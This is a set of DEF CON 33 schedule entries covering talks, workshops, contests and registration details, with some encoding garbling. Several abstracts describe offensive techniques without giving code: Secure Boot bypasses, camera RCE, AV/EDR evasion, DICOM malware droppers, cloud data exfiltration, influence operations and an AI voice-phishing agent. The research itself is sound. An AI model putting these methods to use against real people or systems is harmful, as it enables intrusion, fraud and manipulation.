It is indeed all about the information. Information is powerâand those who control it hold the reins. This course dives deep into the topic of Influence Operations (IO), teaching you how adversaries manipulate, deceive, and control the flow of information to achieve their objectives. From destabilizing governments to swaying elections and ruining careers, IO is a tool used by state and non-state actors alike. The question is, how do you defend against it?

In this fast-paced, hands-on course, weâll break down how IO is planned, executed, and defended against. Youâll gain the skills and knowledge to not only recognize and counteract these operations but to protect yourself, your organization, and even your country from their impact.

What You'll Learn:


IO Strategies & Tactics: From the basics to advanced techniques, understand how influence operations shape public opinion, corporate behavior, and political landscapes.
Psychological Operations (PSYOP): Explore the manipulation of biases, emotions, perceptions, and actions to control outcomes.
Deception and Counterdeception: Learn how deception campaigns are crafted, and how to spot and disrupt them.
Military Doctrine & TTPs: Understand military frameworks for IO and adapt them for defending against threats.
Incident Response & Defensive Tactics: Equip yourself with practical strategies for detecting and defending against IO campaigns targeting individuals and organizations.
Crafting Messages & Understanding Propagation: Learn the art of creating and spreading messages to achieve specific goalsâwhile also learning how to counter malicious ones.
Real-World Case Studies: From deceptive news to social media manipulation, analyze recent IO campaigns to understand their impact and develop defensive strategies.
Live IO Campaign Contest: Compete in a live âbest IO campaignâ contest, applying the techniques youâve learned during the course to test your strategies. 


By the end of the course, youâll not only have a deep understanding of how IO is executed, but you'll also walk away with practical tools to defend against these attacks. Youâll learn how to recognize the signs of manipulation, understand the motivations behind IO, and develop countermeasures to protect against them.

In a world where information is weaponized, knowing how to protect yourself is no longer optional. Whether youâre securing yourself, an organization, protecting a political campaign, or defending a nation, this course is your toolkit for navigating the complex and increasingly dangerous world of influence operations.

When: Saturday, Aug 9, 09:00 - 09:59 PDT
Where: Online

Description:
Open-source security is facing an existential crisis. From the xz backdoor to Log4Shell and even vulnerabilities in ncurses, we are witnessing a recurring pattern: widely used but poorly scrutinized components becoming critical attack vectors. GRUB2 is no exception.

In this talk, I will present a deep dive into several vulnerabilities I discovered in GRUB2's major filesystem driversâexploitable flaws in one of the most privileged and security-critical pieces of software in the modern boot chain. Despite its role in Secure Boot, GRUB2 lacks fundamental OS security mechanisms (no ASLR, no modern exploit mitigations) and processes a large volume of untrusted inputâviolating Google's ""Rule of 2"" security principle.

We'll begin with an overview of UEFI and Secure Boot, demonstrating how GRUB2 fits into the ecosystem and why it remains an attractive target for attackers. I will then detail my findings, showcasing how an attacker can exploit these flaws to subvert Secure Boot entirely. Through a practical demonstration, we will explore the implications of these vulnerabilitiesâturning a standard bootloader attack into a full-blown compromise of system integrity.

Additionally, I will be describing my journey into discovering similar vulnerabilities other bootloaders such as U-boot and Barebox.

Finally, we will discuss the broader security implications, including the urgent need for stronger security practices in open-source bootloaders and what steps can be taken to prevent the next major supply chain disaster.

This talk will be essential for security researchers, enterprise defenders, and anyone relying on Secure Boot for protection. If you thought your bootloader was secureâthink again.

Note: DCGVR Talks are scheduled 1 hour slots, but the actual presentations can be as short as 30 minutes. Please arrive at the start of the hour.

Where: LVCCW-Level 1-W101-W102 - Map

Description:
Our human registration process this year will be very similar to previous years. Please be patient. All of the times listed here are approximate. 

Basics

Who needs a badge?

A badge is required for each human age 8 and older.

Human?

You are a human if you do not know otherwise. People that are not humans include goons, official speaker, village/community/contest/creator staff, press, black badge holders, or similar. If you are not a human, you need to register separately. If you don't know how, see an NFO goon (NFO Node, formerly known as an infobooth, is where you can get help). The remainder of this message applies only to humans.

Lines? Linecon?

Linecon is your optional opportunity to stand (or sit) in line for human registration to open. Doors will open for linecon on Wednesday at approximately 17:00. When human registration opens on Thursday at approximately 08:00, they start working the linecon queue, and the line will start moving quickly. (Please understand that we will begin processing the line on Thursday morning as soon as the cashiers and materials are in place; we will strive for Thursday 08:00, but actual start may be slightly earlier or later.)

Online badge purchase (aka pre-registration) has no impact on linecon. You can join the line on Wednesday (if you wish) regardless of whether you purchased a badge online or intend to pay with cash. There is only one linecon for both types of badge sales. 

Please help us make this a great experience for everyone by following directions given by goons. After human registration opens, there may be one line for all of registration, or there may be two lines (one for online sales (pre-registration) and one for cash sales). This may also change over time, based on available staffing and necessary crowd control. We will strive to make it easily understandable in-person as to which line you should join. 

Ways to buy a badge


$560 online purchase until July 18, 2025. Tickets are transferable. Please read the details on the linked page.
$580 online purchase until August 1, 2025. Tickets are transferable. Please read the details on the linked page.
$500 cash purchase on-site.
As part of a BlackHat registration.


Online Purchase

You will be emailed a QR code to the email address provided when you bought your badge. Please guard that QR code as though it is cash -- it can only be redeemed once, and anyone can redeem it if they have it (including a photo of it). Badges are picked-up on-site -- they will not be mailed or shipped.

We can scan the QR code either from your phone's display or from a printed copy. You must have the QR code with you in order to obtain your badge. As you approach the front of the line, if you are going to show your QR code on an electronic device, please ensure that your display is set to maximum brightness. 

If you pre-registered, but ultimately are unable to attend DEF CON and want to cancel your purchase, the only way to get a refund is from the original online source. We are unable to provide any refunds on-site at DEF CON. There is a fee to have your badge canceled: $34 before July 18, and $84 on and after July 18.

Online purchases are provided a receipt via email when the purchase is made.

Online purchase -- often referred to as pre-registration -- does not allow you to skip any line/queue to pick up your badge. Once you arrive on-site, you will need to join the existing line for human registration. There may or may not be a dedicated line for pre-registration badge pickup, depending on when you arrive, how long the line is, available staff, etc.

Cash Purchase

Badges will be available for purchase on-site at DEF CON. All badge sales are cash only. No checks, money orders, credit cards, etc., will be accepted. In order to keep the registration line moving as quickly as possible, please have exact change ready as you near the front of the line.

There are no refunds given for cash sales. If you have any doubt about your desire to buy a badge, please refrain from doing so.

We are unable to provide printed receipts at the time of the sale. A generic receipt for the cash sale of a badge will be made available on media.defcon.org after the conference. You are welcome to print your own copy of the receipt on plain paper.

Via BlackHat

If you've purchased a DEF CON badge as part of your Black Hat registration, you're in luck - you will be able to pick up your DEF CON badge at Black Hat on Thursday.  Please bring your Black Hat badge and watch for emails from Black Hat about where exactly the badge pickup will be.  There will be DEF CON goons at Mandalay at the pickup desk to help out and answer questions.

Please note that DEF CON is not able to access or verify Black Hat registration or attendee info.  DEF CON's preregistration list is not the same as Black Hat's.  For help, ask at Black Hat registration or the concierge area. 

Misc

Want to buy multiple badges? No problem! We're happy to sell you however many badges you want to pay for.

If you lose your badge, there is unfortunately no way for us to replace it. You'll have to buy a replacement at full price. Please don't lose your badge. :( 

If you are being accompanied by a full-time caretaker (such as someone who will push your wheelchair, and will accompany you at all times), please ask to speak to a Registration Goon. Your caretaker will receive a paper badge that will permit them to accompany you everywhere you go.

Still need help?

If you have questions about anything regarding human registration that are not addressed here, please ask to speak to a Registration Goon.

Description:
The rapid advancement of large language models (LLMs) is reshaping the landscape of cybersecurity. These models are not only achieving higher benchmarks in math, coding, and cybersecurity tasks but are also being leveraged by threat actors to enhance resource development and social engineering capabilities. As LLMs continue to evolve, what could autonomous cyber capabilities powered by these models look like? How can we responsibly harness their potential for adversary emulation and defense?
In this talk, we will explore the integration of LLMs into MITRE Caldera, a scalable automated adversary emulation platform, and investigate how these models can transform adversary emulation through three distinct paradigms: as planners, as factories for constructing custom cyber abilities, and as forward-deployed autonomous agents. Drawing on existing research, including papers on LLM-assisted malware development and benchmarks for offensive cyber operations, we will examine the capabilities of LLMs in generating plausible emulations of advanced persistent threats (APTs).

The session will feature live demonstrations showcasing how LLMs can replicate adversary profiles, construct new cyber abilities on the fly, and autonomously execute emulation tasks. Attendees will gain insights into the performance of these paradigms, their implications for purple teaming, and the challenges of maintaining realistic emulations.
Finally, we will look ahead to the future of adversary emulation, discussing how APTs might leverage autonomous or semi-autonomous LLM capabilities in practice and the role of increasingly powerful models in shaping the next generation of cybersecurity tools. Whether you're a defender, researcher, or technologist, this talk will provide a compelling glimpse into the possibilities and risks of LLM-enabled adversary emulation.

Blue Team
You are assigned to the Cybersecurity Team servicing four Regional Airports within the IG Labs Regional Airport System. The shift this evening started with routine checking status boards, reviewing threat alerts, and checking for any newly identified vulnerabilities that may have an impact on the system from both Information Technology (IT) and Operational Technology (OT) vectors.

Around midnight, chaos ensues! Runway lighting is turning off at your airport and others nearby, planes are circling waiting to land or diverting to other locations. You must regain access to your systems, find the problem, and restore operation to the Runway Lighting Control System quickly and ensure that the other regional airports your team is responsible for do not lose control of their systems and operations are able to continue without interruption.

Red Team(s)
Cybersecurity Teams are often heavily focused on securing Information Technology (IT) systems and devices but may not consider securing Operational Technology (OT) systems and devices. While OT systems and devices may be connected to IT systems, the type of data and protocols are different.

You start your day exploring OT system vulnerabilities and consider what chaos you could create. You see a report that the runway lighting system at one of the IG Labs Regional Airports has been compromised. You start researching to learn more about the attack and the IG Labs Regional Airport System. Satisfied that you have learned enough to add to the madness that has been created at La Valoria, you decide to launch an attack of your own.

Success will be determined by the ability to disrupt the control and operations of the Runway Lighting Systems for the IG Labs Regional Airports at the OT level. DoS and DDoS attacks are not permitted as the intent is to demonstrate an understanding of OT systems, their functionality, and protocols.

Description:
In March 2025, a critical supply chain attack struck the popular GitHub Action tj-actions/changed-files, used by more than 23,000 repositories. The attacker slipped in a malicious version that silently exfiltrated CI/CD secrets by printing them to workflow logsâeverything from Personal Access Tokens to private SSH keys was suddenly at risk. This incident (CVE-2025-30066) revealed just how easy it is for a trusted third-party action to turn into a threat vector, especially when security controls around CI/CD workflows are lacking.

We built Flowlyt as a static analysis and policy-as-code tool that scans GitHub Actions workflows for signs of malicious behavior, hardcoded secrets, and insecure patterns. With support for Open Policy Agent (OPA), it lets security teams define and enforce custom rules that align with their CI/CD security standards.

As we have seen with AIxCC, AI brings new tools to help with cybersecurity. But developing and operating AI/ML applications introduces new dimensions of risk due to their dynamic behavior, inherent complexity, and often opaque decision-making processes. The transition from Development and Operations (DevOps) to Development, Security, and Operations (DevSecOps) revealed the need for security practices integrated into the Software Development Life Cycle (SDLC) to address critical software security gaps. Machine Learning Operations (MLOps) will now need to go through the same transition into MLSecOps. MLSecOps places a strong emphasis on integrating security practices within the ML development life cycle. It establishes security as a shared responsibility among ML developers, security practitioners, and operations teams. Embracing this methodology enables early identification and mitigation of security risks, facilitating the development of secure and trustworthy ML models.

Description:
Sector Down is a high-stakes, immersive multiplayer card game where critical infrastructure and cybersecurity collide. Designed for teams of 5, 10, 15, or 20 players, this simulation pits defenders and attackers against each other in a race against the inevitable: The Doom Clock.

ð¡ï¸Defend or Disrupt

Players are divided into two sides:
- Blue Team â Critical infrastructure defenders. Each Blue player manages a sector with three vital facilities: Physical, Network, and Financial. Their mission? Keep the systems alive and online while working together to run out the clock.
- Red Team â Offensive disruptors. Red players attempt to take down facilities using calculated cyberattacks and chaos tactics. Their goal: force sector collapses and trigger the Doom Clock.

â±ï¸ Time-Based Tactics

The game progresses in strategic phases where players draw cards, take action using worker tokens, and discard based on hand limits. Watch out for unpredictable âWhite Playsâârandom game events that add surprise twists every few rounds.

ð¥ The Doom Clock

When half of all sectors or any core sectors go down, the Doom Clock starts ticking. Teams must respond fast: Blue must recover systems before the countdown hits zero, or Red claims victory.

ð¤ Team Dynamics


Worker Sharing: Blue teammates can lend each other resources in bonus phases.
Overtime Mechanics: When the pressureâs on, Blue players can double down on effortâwith the tradeoff of worker exhaustion in future turns.


ð® Why You Should Play


Dive into a realistic cybersecurity crisis.
Learn how interdependent systems behave under attack.
Collaborate and compete with hackers, healthcare defenders, and critical infrastructure enthusiasts.
Engage with a visually rich map interface and fast-paced card dynamics.


Whether you're a strategist, a chaos agent, or just love competitive simulation, Sector Down challenges your mind and your teamwork. Can your team hold the line or will your sector go dark?â Come play during DEF CON 33.

Description:
Let's cut through the BS - if you're not using regex properly, you're leaving money on the table as a hacker. This workshop shows you how regex can crack open targets that automated tools miss.

We'll skip the boring theory and jump straight into the good stuff: how to use regex to find juicy endpoints, bypass filters, and automate your recon. You'll learn how actual hackers use regex to:


Break postMessage filters and CORS rules that "look" secure
Turn harmless open redirects into account takeovers
Spot SSRF opportunities that scanners don't catch
Rip through JavaScript files to find hidden APIs and endpoints
Find interesting hosts, secrets and keys in GitHub repos before others do


1 Hour. Hands on. Come hack!

After years of planning and development, the highly anticipated new version of rs0n's bug bounty hunting framework is ready to go!  Aptly named The Ars0n Framework v2, this tool is specifically designed to help eliminate the friction for aspiring bug bounty hunters.  This tool not only automates the most commonly used bug bounty hunting workflows but each section includes detailed lessons that help beginners understand the ""Why?"" behind the methodology.   Finally (and perhaps most exciting of all), reports generated from the data collected provide the user with guidance at critical decision points based on rs0n's many years of bug bounty hunting experience. Simply put, this tool is designed to help beginners compete w/ the pros on Day 1, and the best part is it's absolutely FREE!

In this talk, rs0n will go into extensive detail about how the tool works, what changes were made from version 1, how to use (and troubleshoot) the framework, ways of engaging with the community, and much more!  The goal is to provide the audience with all the information they need to start using the tool today.

Big data, big mess. Bigger and more data is in Fabric, the more messy it can be. Azure unified the data lake house, data warehouse and PowerBI services into a SaaS platform called Fabric. In this talk, we discuss the three areas in the tenant level settings to look after and not to open up Fabric to everything. Then we will discuss data exfiltration scenarios (like data pipeline or notebook etc), how is it possible to create backdoor account (i.e.: Activator).

Intro - 1min
Who am I and what is Fabric.

Tenant Level Settings to Review - 4mins
Selecting the top 3 tenant level areas (External Data Sharing, Admin API calls, Information Protection) to review why they can be dangerous.

Data Exfiltration via Data Pipeline, Notebook, Shortcut, SQL Endpoint, Mirrored Db - 12mins
Discussing the possibilities of how data pipeline can automatically copy data from our own tenant's source to a destination in a different tenant. SQL Endpoint is automatically created for reading purposes. Guest account in Entra ID can be added to the workspace as viewer and using SQL Server Management Studio (SSM) to open SQL analytics endpoint. Mirrored Database is automatically synchronize data between 2 database where the destination can be an external tenant. A notebook is all about executing code and handling existing data (handing out the data).
Demo video about a pipeline copy to another tenant storage account.

Backdoor via Activator (Notebook, Power Automate, Scheduled Spark Job) - 13mins
Discussing how the Activator can be used to create a backdoor user via executing python code via Notebook, Scheduled Spark Job or low-code Power Automate.

Design and build a functioning amateur radio antenna using non-traditional or improvised materials (e.g., tin cans, coat hangers, umbrellas, plumbing pipe).

If it looks absurd and still gets on the air, you're doing it right. HRV will have connectors, soldering stations, and some raw materials for available for use. See what other materials you can find to make the best improvised antenna!

All antennas must be summitted by 10AM on Sunday.

Any antennas not picked up by 2pm on Sunday will be donated to the Ham village or disposed accordingly.

Up for more of a challenge? Attempt to solve the hidden puzzle within the fox hunt to win the ultimate prize!

--

PROJECT ACCESS: A Fox Hunt in the Shadows

The last surviving fragments of Project ACCESS, a defunct open comms initiative, have resurfaced. The faceless OmniCorp thought they had erased it from the spectrum, but rogue operatives are pushing back. Disguised among the DEF CON crowd, Foxes are carrying the pieces needed to reboot the system.

Theyâre broadcasting open signals across the con space. Your job? Track them down, follow the trail, and recover the payloads. Some Foxes are stationary. Others are on the move. All of them have something you needâbut they wonât just hand it over. Youâll have to answer DEF CON trivia, solve puzzles, or earn their trust in creative ways.

This isnât a gear-only hunt. Whether youâre rocking SDRs, handheld radios, or just tuned into the right frequency, youâve got a shot. Itâs part signal chase, part real-world goose chase, and 100% hacker weirdness.

Expect:
- Live human Foxes broadcasting short-range signals
- Some Foxes roaming the con floor hunt them down, respectfully
- DEF CON history questions, crypto puzzles, and maybe a social engineering twist or two
- Physical items or clues exchanged when you succeed
- No encryption. No gatekeeping. Just old school radio and clever chaos.

Think you can track the signal, crack the code, and restore the last breath of open access?

Then grab your gear, tune in, and start hunting.

Participant Prerequisites

RF Fox Hunt(s): To participate in the RF fox hunt(s), you will need a radio or scanner that can receive signals in the 2m and/or 70cm Amateur Radio Bands (144.000 MHz - 148.000 MHz, 420.000 MHz - 450.000 MHz).

Something to read NFC cards.

The Red Team CTF is designed to simulate real-world scenarios in which attackers attempt to penetrate the security of a network or system. Participants are expected to use a wide range of hacking techniques, tools, and skills to identify and exploit vulnerabilities in the target network.

Teams are typically composed of experienced hackers, penetration testers, and security researchers who have a deep understanding of the latest cybersecurity threats and attack techniques. They must work together to uncover and exploit vulnerabilities in the target network, while also evading detection and countermeasures put in place by the Blue Team.

The Red Team CTF at DEF CON is considered one of the most challenging and prestigious CTF competitions in the world, with participants coming from all over the globe to compete. It is a high-pressure, high-stakes event that tests the limits of participants' technical and strategic abilities, and offers a unique opportunity to showcase their skills and knowledge in front of a global audience of Hackers.

Participant Prerequisites

Participants are required to bring a laptop with the ability to connect to DEF CON WiFi or other internet connection.

Description:
In this game capture the flag you will be presented with real configurations of real wireless and radio technologies to attack. Practice your skill and learn new ones from Radio Frequency IDentification (RFID) through Software Defined Radio (SDR) and up to Bluetooth and WiFi. There may even be Infrared, if you have the eye for it.

RF Hackers Sanctuary is once again holding the Radio Frequency Capture the Flag (RFCTF) at DEF CON 32. RFHS runs this game to teach security concepts and to give people a safe and legal way to practice attacks against new and old wireless technologies.

We cater to both those who are new to radio communications as well as to those who have been playing for a long time. We are looking for inexperienced players on up to the SIGINT secret squirrels to play our games. The RFCTF can be played with a little knowledge, a pen tester's determination, and $0 to $$$$$ worth of special equipment. Our virtual RFCTF can be played completely remotely without needing any specialized equipment at all, just using your web browser! The key is to read the clues, determine the goal of each challenge, and have fun learning.

This game doesn't let you sit still either, as there are numerous fox hunts, testing your skill in tracking various signals. If running around the conference looking for WiFi, Bluetooth, or even a Tire Pressure Monitoring System (TPMS) device sounds like fun, we are your source of a higher step count.

There will be clues everywhere, and we will provide periodic updates via discord and twitter. Make sure you pay attention to what's happening at the RFCTF desk, #rfctf on our discord, on Twitter @rf_ctf, @rfhackers, and the interwebz, etc. If you have a question - ASK! We may or may not answer, at our discretion.

This year, for the first time ever, Bug Bounty Village is bringing you a Capture the Flag with a twist. This CTF is designed to feel just like a real bug bounty hunt.

Dive into a vulnerable application and see if you can uncover its hidden weaknesses just like you would on a bug bounty program. The CTF is designed to be accessible for all experience levels, from beginners looking for their first bug to veteran hunters eager for a very interesting challenge. Expect a range of vulnerabilities, from trivial finds to sophisticated ones that will push you to the limit.

But thatâs not all. Weâre adding a unique real-world flavor to the competition. Participants onsite at DEF CON will submit some of their bug reports for those to be validated by real bug bounty triagers volunteering their expertise to make this experience as real as possible. This process will determine scores based not just on technical prowess but on report quality and professionalism, just like in a bug bounty program.

Get ready for a realistic bug bounty experience, a chance to grow your skills, connect with the community, and show what youâre made of.

Description:
Limitations can result in creative solutions. For most hackers I know, this is core to why we do what we do. Being an artist has taught me to do the challenging and ridiculous at all costs. Most of the time, these values align, but sometimes they result in fabulous disasters. As of this writing, this is not the latter. 

This talk is a reflection on badge creation, challenges, the badge curse, and the blurred lines between art and hacking. It examines how we perceive and value creation and making, inside and outside of our own circles. 

SpeakerBio:  Mar
Mar has spent over 15 years contributing to DEF CON, ranging from illustration, badges & interactive experiences to art direction. Last year they designed & directed the creation of the DEF CON 32 Raspberry Pi badge, on which attendees played a custom game of the convention itself in real-time.

Mar has helped found, and has chaired hackerspaces and an art collective. They've painted public murals in the US and abroad, and held a residency at the Denver Art Museum, which explored the relationships between people and their identities online.

Description:
What are the consequences if an adversary compromises the surveillance cameras of thousands of leading Western organizations and companies? As trust in Chinese-made IoT devices declines, organizations face limited alternativesâespecially in video surveillance. Many governments have already banned Dahua and Hikvision products in sensitive facilities, further narrowing their choices. This concern drove our research, revealing that surveillance platforms can be double-edged swords.

We focused on Axis Communications, a major player in video surveillance widely used by U.S. government agencies, schools, medical facilities, and Fortune 500 companies.

In our talk, we will present an in-depth analysis of the Axis.Remoting communication protocol, uncovering critical vulnerabilities that allow attackers to achieve pre-auth RCE on Axis platforms. This access could serve as a gateway into an organizationâs internal network via its surveillance infrastructure. Additionally, we identified a novel technique for passive data exfiltration, enabling attackers to map organizations using this equipmentâpotentially aiding in targeted attacks.

Description:
In this talk we present a collection of attacks against the most widely used EV charging protocol, by exploiting flaws in the underlying power-line communication technologies affecting almost all EVs and chargers.

Specifically, we target the QCA 7000 Homeplug modem series, used by the two most popular EV charging systems, CCS and NACS.

We demonstrate multiple new vulnerabilities in the modems, enabling persistent denial of service.

To better understand the scope of these issues, we conduct a study of EV chargers and vehicles, and show widespread insecurities in existing deployments.

We show a variety of practical real-world scenarios where the HomePlug link can be used to hijack EV charging communications, even at a distance.

Finally, we present results from reverse engineering the firmware and how we can gain code execution.

Description:
When confronted with malicious macOS binaries, analysts typically reach for a disassembler and immerse themselves in the complexities of low-level assembly. But what if this tedious process could be skipped entirely?

While many malware samples are distributed as native macOS binaries (easily run with a simple double-click), they frequently encapsulate scripts hidden within executable wrappers. Leveraging frameworks such as PyInstaller, Appify, Tauri, and Platypus, malware authors embed their scripts with binaries, complicating traditional analysis. Although these frameworks share the goal of producing natively executable binaries, each employs a distinct method to embed scripts, thus necessitating tailored extraction tools and approaches.

Using real-world macOS malware (such as Shlayer, CreativeUpdate, GravityRAT, and many others), we'll first demonstrate how to identify these faux binaries and then how to efficiently extract or reconstruct their embedded scripts, bypassing the disassembler entirely!

Description:
Cryptocurrency is everywhere now. Billion-dollar companies are built on it, entire economies run on Bitcoin, and cybercriminals love using it to finance their operations or hide stolen money. Cryptocurrencies promise anonymity, yet blockchain transactions are fully public, and make it tricky to hide funds.

In February 2025, the Bybit breach exposed two advanced attack vectors. First, a third-party wallet tool was compromised through malicious JavaScript injected into its logic, allowing attackers to manipulate smart contract behavior. Second, a SAFE Wallet developer was tricked through social engineering into running a fake Docker container, giving attackers persistent access to his machine.

With control established, they hijacked proxy contracts and executed stealth withdrawals of ETH and ERC-20 tokens. The stolen assets were laundered through decentralized exchanges, split across multiple wallets, bridged to Bitcoin, and passed through mixers like Wasabi Wallet.

So how do attackers manage to launder crypto, and how can we stop them? Using the 1.46 billion dollar Bybit hack by North Koreaâs Lazarus Group as a case study, this talk breaks down each laundering step and explains how to automate tracking and accelerate investigations using AI.

Description:
BOAZ (Bypass, Obfuscate, Adapt, Zero-Trust) evasion was inspired by the concept of multi-layered approach which is the evasive version of defence-in-depth first proposed in a presentation at BH USA14. BOAZ was developed to provide greater control over combinations of evasion methods, enabling more granular evaluations against antivirus and EDR. It is designed to bypass before, during, and post execution detections that span signature, heuristic, and behavioural detection mechanisms. BOAZ supports both x86/x64 binary (PE) or raw payload as input and output EXE or DLL. It has been tested on separated Windows 11 Enterprise, Windows 10, and Windows Server 2022 VMs with 14 desktop AVs and 7 EDRs installed including Windows Defender, Norton, BitDefender, Sophos, and ESET. The design of BOAZ evasion is modular, so users can add their own toolset or techniques to the framework. BOAZ is written in C++ and C and uses Python3 as the main linker to integrate all modules. There have been significant improvements implemented since its inception. The new version of the BOAZ evasion tool, set for release at DEF CON 33, will feature three novel threadless process injection primitives, along with newly implemented loaders and behavioural evasion techniques.

Welcome to the âfunâ world of IoT, where security is often an afterthought and vulnerabilities lurk around every corner. This presentation is a guide for vendors on what not to do when designing IoT devices and a survival manual for users to spot insecure gadgets.
Ever wondered if your IoT device is spilling your home WiFi secrets to the cloud over HTTP? Spoiler alert: maybe :)
Pairing your device over open WiFi and HTTP while providing your home WiFi credentials? Just to vacuum clean your home? 
How about IoT devices lying about their Android version? But donât worry, it already comes with malware pre-infected. 
Wouldnât it be nice to access the clear-text admin passwords before authentication? How about multiple different ways to do that?
Would you like to see reverse engineering an N-day command injection vulnerability in the login form of a popular NAS device? 
What could be the easiest way to figure out the (static) AES encryption key for a home security alarm solution? Just RTFM! 
Why bother with memory corruption when command injection is still the king of IoT threats? I'll break it down for you, with an analysis of challenges with scalable IoT memory corruption exploits, and the challenges with blind ROP. 
Last but not least, letâs discuss why Busybox is ânot the bestâ choice for IoT development.

Description:
Buildings are largely overlooked when it comes to cyber security. The onus is typically placed on physically securing the building and the people inside of them. What most gloss over is the fact that industrial control systems run these buildings and without them, every day functions become unavailable and downright dangerous. The dangers are growing as buildings become more "connected" and require internet access to operate (ex. sustainability and IoT). Malicious use of engineering protocols (Modbus, Fox, BACNet) and targeted attacks against BAS systems are growing (ex. KNXLock).â

Environments run the gamut from overly secure, to the point of crippling, all the way to leaving RDP exposed with no logging or MFA to critical systems. There is no easy fix, properties must invest in technology and people to create a defensible environment. This presentation will show how cyber security can be enabled which fits with the business's operations and minimal disruption. 

Building types are not constrained to only office space. Properties come in all varieties from warehouses and manufacturing spaces to data centers and shopping malls. All of this needs to be taken into account when assessing the environment and recommending tools and procedures. This talk will cover common architectures seen, typical control systems found in buildings (BMS, FLS, elevator, lighting, power...), reproducible steps to help companies/users understand their vulnerabilities and how we, as an industry, move forward. 

For the most part, these are not technical problems, but a literal gap that needs to be addressed directly by budgetary and policy controls. The industry is pushing for cybersecurity budgeting, standards and visibility for properties, which are largely ignored or misunderstood by owners and operators. This is a solvable problem and I want attendees to feel empowered to ask tough questions and be prepared to have an educated conversation about the risks and not use fear mongering or scare tactics to get cybersecurity put in place.

Description:
The DICOM image format, used globally in healthcare to store and transmit medical images, contains a rarely discussed flaw in its header structure that can be exploited to hide malicious payloads. In this talk, we explore how attackers can embed code into DICOM files that still open and display normally in medical imaging software. Youâll learn how this permissive header allows for the creation of polyglot filesâvalid DICOM images that double as malware droppers. Because most static antivirus engines treat DICOM files as benign or ignore them altogether, these hybrid files can often bypass traditional detection mechanisms entirely. Weâll demonstrate how this works in practice, walking through the process of crafting DICOM-based payloads and showing how they behave on a target system. Attendees will also gain insight into why these files evade static scans and what this means for healthcare security at large.This talk is aimed at both red teamers and defenders. Offensive security professionals will gain a novel method for payload delivery in highly regulated environments, while defenders will leave with practical strategies for detecting and mitigating this class of threat. This presentation highlights how blind trust in industry-standard formats can create dangerous blind spots in security. The DICOM formatâs flexibilityâoriginally designed for compatibilityânow serves as a potential attack vector, and itâs time the infosec community pays attention.

Description:
Mobile Device Management (MDM) is designed to harden enterprise devices, but what happens when security testing needs to inspect runtime behavior on these same locked devices? This workshop dives deep into bypassing typical MDM-imposed restrictions to perform dynamic runtime API testing on apps that rely heavily on MDM policies. Weâll dissect real-world use cases where traditional testing tools fail and walk through the Appknox approach for injecting custom instrumentation and intercepting APIs in live environments, without root, jailbreak, or MDM tampering. Attendees will learn practical methods to inspect API calls, simulate dynamic inputs, and reverse-engineer mobile apps at runtime, even when locked inside the MDM âvault."

In his first-ever public appearance, elite hacker ZwinK joins Casey Ellis (CEO of BugCrowd) and Keith Busby (Acting CISO of the Centers for Medicare & Medicaid Services (CMS)) for a rare, unscripted look inside one of the largest, and most consequential bug bounties in the federal government. CMS touches the lives of 150M+ Americans and secures data that must not go offline â which made its decision to invite hackers inside both radical and risky.

This talk will cover how the program worked, what CMS learned, and how ZwinK uncovered critical vulnerabilities in public-facing federal systems. ZwinK will share his surprising favorite tactics, tools, and recon strategies â including how he hunts for high-value bugs in complex, regulated environments. Keith will explore how CMS weighed the risks of shining a light on its attack surface and how they battled the naysayers and managed federal red tape. Casey will discuss how BugCrowd is helping agencies shift from fear to resilience by operationalizing collaboration with hackers.

Expect real lessons, live banter, and a sharp edge â especially if your agency (or client) is still on the fence about bug bounties.  No knowledge of healthcare is needed to enjoy this panel, just come curious!

Description:
Quantum computing is no longer science fictionâitâs shipping racks. But as we rush to build quantum machines, are we repeating the same mistakes of closed, opaque architectures that made classical computing insecure in the first place?

In this talk, weâll dissect the anatomy of a modern quantum computing stackâfrom cryo-control layers and QPU hardware to compilers and orchestration interfacesâand map out where todayâs vulnerabilities hide and tomorrowâs attack surfaces may emerge, when large scale, quantum-interconnected fault-tolerant quantum computers will cooperate to run algorithms. Weâll look under the hood of real-world platforms, including examples like whitebox products under development, to see how modularity (or the lack of it) impacts trust, resilience, and innovation.

Weâll argue for an open, whitebox approach to quantum systems: where interoperability, transparency, and independent testing arenât nice-to-havesâtheyâre mandatory for a secure quantum future. Weâll explore how the current supply chain and ecosystem influence who gets to build, audit, and break these systemsâand why hackers, tinkerers, and architects alike must care.

We'll end with a call to anyone that likes open protocols, clean interfaces, and breaking things to make them better, as our invitation to Join the Quantum Stack Hack.

Description:
In todayâs threat landscape, people are often the weakest linkâand attackers are aware of it. From phishing and impersonation to executive targeting and account compromise, adversaries increasingly use open-source intelligence (OSINT) to build detailed profiles of individuals long before launching an attack.x000D
x000D
This session dives into the evolving art of people-focused reconnaissance, demonstrating how seemingly harmless public data can be weaponized into precise social engineering campaigns, identity spoofing, and credential pivoting.x000D

Description:
Join the founding members of Red Team Village as they share what theyâve learned building a community focused on offensive security education and discuss their evolution from hands-on leaders to mentors and advisors. From starting as a DEF CON village to growing into a 20,000+ member community, the founders will explore the complexities of building a successful community as well as the transition to letting others lead day-to-day operations.

This session covers the practical realities of community building and leadership evolution - managing volunteers, scaling membership, balancing content for different skill levels, and maintaining community culture during growth. The founders will share what worked in running the village operations, handling logistics at scale, and responding to community feedback to continuously improve the experience.

The discussion will address key questions about running and transitioning technical communities: How do you manage village operations effectively? What have you learned about scaling community management? How do you handle criticism and feedback constructively? How do you identify and develop new leaders? When and how do you step back without losing community culture? The founders will also cover practical aspects like managing large-scale events and evolving with community needs.

The session wraps up with Q&A where you can explore specific challenges around building technical communities, leadership transitions, and maintaining founding vision while empowering new voices.

Whether youâre involved in community building, thinking about starting something new, or wondering about sustainable leadership models, this panel offers honest perspectives from founders navigating the transition from builders to advisors.

Description:
The path from a working demo to an AI vishing agent that can survive in the wild is littered with failed calls and bad prompts. We walked that path so you don't have to. This talk is a rapid-fire rundown of 10 lessons learned from taking a bot into production. We'll dive into: how to craft pretexts that don't collapse under pressure, the dirty secrets of managing conversational latency, and the surprising challenge of handling accents and background noise. IÃ­ll break down the trade-offs between self-hosted models and commercial API infrastructure, their inherent limitations, and the privacy considerations to address. Learn how to tune prompts for believable improvisation and avoid the uncanny valley.

Description:
